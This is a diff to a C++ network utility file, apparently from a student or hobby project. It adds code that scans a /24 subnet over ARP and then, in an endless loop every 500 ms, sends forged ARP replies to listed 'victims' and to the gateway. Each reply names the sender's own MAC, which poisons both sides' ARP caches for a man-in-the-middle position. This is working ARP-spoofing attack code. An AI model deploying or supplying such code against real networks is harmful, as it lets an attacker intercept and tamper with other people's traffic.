@@ -1,5 +1,16 @@
 #include "utils.hpp"
 
+using namespace std;
+
+// vector<unsigned char> str2mac(const char *txt, vector<unsigned char> mac){
+//     sscanf(txt, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]);
+//     return mac;
+// }
+void str2mac(const char *txt, unsigned char *mac){
+    sscanf(txt, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]);
+    return;
+}
+
 /*
  * Converts struct sockaddr with an IPv4 address to network byte order uin32_t.
  * Returns 0 on success.
@@ -124,9 +135,84 @@ out:
     return err;
 }
 
-int send_arp_rply(){
+int arp_reply(int ifindex, unsigned char *src_mac, unsigned char *dst_mac, uint32_t src_ip, uint32_t dst_ip){
+    int fd;
+    bind_arp(ifindex, &fd);
     
+    unsigned char buffer[BUF_SIZE];
+    memset(buffer, 0, sizeof(buffer));
+
+    struct sockaddr_ll socket_address;
+    socket_address.sll_family = AF_PACKET;
+    socket_address.sll_protocol = htons(ETH_P_ARP);
+    socket_address.sll_ifindex = ifindex;
+    socket_address.sll_hatype = htons(ARPHRD_ETHER);
+    socket_address.sll_pkttype = (PACKET_HOST);
+    socket_address.sll_halen = MAC_LENGTH;
+    socket_address.sll_addr[6] = 0x00;
+    socket_address.sll_addr[7] = 0x00;
+
+    struct ethhdr *send_req = (struct ethhdr *) buffer;
+    struct arp_header *arp_req = (struct arp_header *) (buffer + ETH2_HEADER_LEN);
+    ssize_t ret;
+
+    //destination MAC
+    memcpy(send_req->h_dest, dst_mac, MAC_LENGTH);
+    memcpy(arp_req->target_mac, dst_mac, MAC_LENGTH);
+
+    //Set source mac to our MAC address
+    memcpy(send_req->h_source, src_mac, MAC_LENGTH);
+    memcpy(arp_req->sender_mac, src_mac, MAC_LENGTH);
+    memcpy(socket_address.sll_addr, src_mac, MAC_LENGTH);
+
+    /* Setting protocol of the packet */
+    // 0x0806 for ARP
+    send_req->h_proto = htons(ETH_P_ARP);
+
+    /* Creating ARP request */
+    arp_req->htype = htons(HW_TYPE);
+    arp_req->ptype = htons(ETH_P_IP);
+    arp_req->hlen = MAC_LENGTH;
+    arp_req->plen = IPV4_LENGTH;
+    arp_req->opcode = htons(ARP_REPLY);
+
+    //debug("Copy IP address to arp_req");
+    memcpy(arp_req->sender_ip, &src_ip, sizeof(uint32_t));
+    memcpy(arp_req->target_ip, &dst_ip, sizeof(uint32_t));
+
+    ret = sendto(fd, buffer, 42, 0, (struct sockaddr *) &socket_address, sizeof(socket_address));
+    close(fd);
+    return ret;
 }
+
+void thread_reply(const char *ifname, vector<string> vctms, map<string, string> arp_table, unsigned char *gw_mac, uint32_t gw_ip){
+    uint32_t my_ip;
+    int ifidx;
+    unsigned char my_mac[6];
+    get_if_info(ifname, &my_ip, my_mac, &ifidx);
+
+    while(true){
+        unsigned char *vctm_mac = new unsigned char[6];
+        for(uint i = 0; i < vctms.size(); i++){
+            str2mac(arp_table[vctms[i]].c_str(), vctm_mac);
+            // to victims
+            arp_reply(ifidx, my_mac, vctm_mac, gw_ip, inet_addr(vctms[i].c_str()));
+            // to gateway
+            arp_reply(ifidx, my_mac, gw_mac, inet_addr(vctms[i].c_str()), gw_ip);
+        }
+        //free(vctm_mac);
+        // sending every 500ms
+        this_thread::sleep_for(chrono::milliseconds(500));
+    }
+}
+
+// void thread_reply(int ifindex, unsigned char *src_mac, unsigned char *dst_mac, uint32_t src_ip, uint32_t dst_ip){
+//     while(true){
+//         arp_reply(ifindex, src_mac, dst_mac, src_ip, dst_ip);
+//         // sending every 500ms
+//         this_thread::sleep_for(chrono::milliseconds(500));
+//     }
+// }
 
 /*
  * Gets interface information by name:
@@ -222,7 +308,7 @@ out:
  * Reads a single ARP reply from fd.
  * Return 0 on success.
  */
-int read_arp(int fd, std::map<std::string, std::string> &arp_table)
+int read_arp(int fd, map<string, string> &arp_table)
 {
     //debug("read_arp");
     struct timeval timeout = {0, 300};
@@ -254,12 +340,11 @@ int read_arp(int fd, std::map<std::string, std::string> &arp_table)
         debug("Not an ARP reply");
         //goto out;
     }
-    //debug("received ARP len=%ld", length);
     struct in_addr sender_a;
     memset(&sender_a, 0, sizeof(struct in_addr));
     memcpy(&sender_a.s_addr, arp_resp->sender_ip, sizeof(uint32_t));
     //debug("Sender IP: %s", inet_ntoa(sender_a));
-    //std::cout << inet_ntoa(sender_a) << '\t';
+    //cout << inet_ntoa(sender_a) << '\t';
     char dst_mac[18];
     sprintf(dst_mac, "%02X:%02X:%02X:%02X:%02X:%02X",
             arp_resp->sender_mac[0],
@@ -268,18 +353,10 @@ int read_arp(int fd, std::map<std::string, std::string> &arp_table)
             arp_resp->sender_mac[3],
             arp_resp->sender_mac[4],
             arp_resp->sender_mac[5]);
-    //std::cout << dst_mac << '\n';
+    //cout << dst_mac << '\n';
 
     char *ip = inet_ntoa(sender_a);
     arp_table[ip] = dst_mac;
-
-    // debug("Sender MAC: %02X:%02X:%02X:%02X:%02X:%02X",
-    //       arp_resp->sender_mac[0],
-    //       arp_resp->sender_mac[1],
-    //       arp_resp->sender_mac[2],
-    //       arp_resp->sender_mac[3],
-    //       arp_resp->sender_mac[4],
-    //       arp_resp->sender_mac[5]);
 
     ret = 0;
 
@@ -293,7 +370,7 @@ out:
  * interface <ifname> to IPv4 address <ip>.
  * Returns 0 on success.
  */
-int test_arp(const char *ifname, uint32_t ip, std::map<std::string, std::string> &arp_table) {
+int test_arp(const char *ifname, uint32_t ip, map<string, string> &arp_table) {
     int ret = -1;
     uint32_t dst = ip;
     if (dst == 0 || dst == 0xffffffff) {
@@ -318,15 +395,13 @@ int test_arp(const char *ifname, uint32_t ip, std::map<std::string, std::string>
         // get subnet /24
         dst = dst & 0x00FFFFFF;
         dst = dst | (i << 24);
+        // ignore myself
+        if(src == dst) continue;
         if (send_arp(arp_fd, ifindex, mac, src, dst)) {
             err("Failed to send_arp");
             goto out;
         }
     }
-    // if (send_arp(arp_fd, ifindex, mac, src, dst)) {
-    //     err("Failed to send_arp");
-    //     goto out;
-    // }
 
     while(1) {
         int r = read_arp(arp_fd, arp_table);
